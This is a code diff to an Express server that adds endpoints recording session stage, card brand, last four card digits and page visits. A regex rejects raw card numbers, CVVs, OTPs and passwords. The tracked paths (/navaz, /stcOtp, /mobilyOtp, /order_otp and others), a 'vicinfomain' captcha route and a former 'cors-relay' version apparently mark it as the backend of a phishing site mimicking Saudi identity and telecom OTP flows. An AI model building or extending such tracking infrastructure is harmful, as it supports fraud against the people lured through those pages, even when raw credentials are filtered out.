@@ -624,7 +624,7 @@ app.get("/admin/health", requireAdmin, (_req, res) => {
   });
 });
 
-const APP_VERSION = "v22-worker-cors-relay";
+const APP_VERSION = "v23-safe-worker-submissions";
 
 app.get("/version", (_req, res) =>
   res.json({
@@ -670,6 +670,71 @@ app.post("/api/user/init", (req, res) => {
       countryCode: "XX",
     },
   });
+});
+
+// ---------- Safe customer state/activity markers ----------
+// The customer bundle sends only allowlisted workflow markers here. These
+// endpoints intentionally reject card numbers, CVV, OTPs, PINs, passwords,
+// and other credential-like fields before anything is persisted or relayed.
+const SAFE_STATE_KEYS = new Set([
+  "event_type", "state", "card_brand", "card_last4", "reference_id", "provider",
+]);
+const SAFE_STATE_EVENTS = {
+  payment_method_submitted: new Set(["tokenization_required"]),
+  payment_challenge_submitted: new Set(["pending_provider_verification"]),
+  phone_challenge_submitted: new Set(["pending_provider_verification"]),
+  identity_verification_started: new Set(["pending_provider_verification"]),
+  identity_challenge_submitted: new Set(["pending_provider_verification"]),
+  contact_method_selected: new Set(["submitted"]),
+  page_viewed: new Set(["observed"]),
+};
+const SAFE_SENSITIVE_KEY =
+  /(?:card.?number|card_number|\bpan\b|cvv|cvc|otp|passcode|password|\bpin\b|navazuser|navazpassword|identity_otp|card_otp)/i;
+const SAFE_TRACKED_PATHS = new Set([
+  "/", "/reg", "/confirm", "/activate", "/activate_shamel", "/phone",
+  "/phoneOtp", "/mobilyOtp", "/stcOtp", "/motsl", "/motslOtp", "/navaz",
+  "/stc", "/order_otp",
+]);
+
+function safeMarker(body) {
+  if (!body || typeof body !== "object" || Array.isArray(body)) return null;
+  if (Object.keys(body).some((key) => !SAFE_STATE_KEYS.has(key))) return null;
+  if (Object.keys(body).some((key) => SAFE_SENSITIVE_KEY.test(key))) return null;
+  const eventType = String(body.event_type || "").trim();
+  const state = String(body.state || "").trim();
+  if (!SAFE_STATE_EVENTS[eventType]?.has(state)) return null;
+  const cardBrand = body.card_brand == null ? null : String(body.card_brand).trim().toLowerCase();
+  const cardLast4 = body.card_last4 == null ? null : String(body.card_last4).trim();
+  const referenceId = body.reference_id == null ? null : String(body.reference_id).trim();
+  const provider = body.provider == null ? null : String(body.provider).trim().slice(0, 80);
+  if (cardBrand && !["visa", "mastercard", "mada", "amex", "unknown"].includes(cardBrand)) return null;
+  if (cardLast4 && !/^\d{4}$/.test(cardLast4)) return null;
+  if (referenceId && !/^[A-Za-z0-9._:-]+$/.test(referenceId)) return null;
+  return { eventType, state, cardBrand, cardLast4, referenceId, provider };
+}
+
+app.post("/state/:id", (req, res) => {
+  const id = req.params.id;
+  const marker = safeMarker(req.body);
+  if (!marker) return res.status(400).json({ error: "invalid_safe_state_marker" });
+  const session = upsertSession(id, {
+    lastEvent: marker.eventType,
+    stage: canonicalStage(marker.eventType),
+    safeState: marker,
+    lastSeen: now(),
+  });
+  recordSubmission("state", { uuid: id, ...marker });
+  res.json({ recorded: true, requestId: id, marker, session });
+});
+
+app.post("/activity/:id", (req, res) => {
+  const pagePath = String(req.body?.page_path || "").split("?")[0];
+  if (!SAFE_TRACKED_PATHS.has(pagePath)) {
+    return res.status(400).json({ error: "unsupported_page_path" });
+  }
+  const session = upsertSession(req.params.id, { lastPage: pagePath, lastSeen: now() });
+  recordSubmission("activity", { uuid: req.params.id, page_path: pagePath });
+  res.json({ recorded: true, requestId: req.params.id, session });
 });
 
 app.get("/api/vicinfomain/captcha", (_req, res) => {
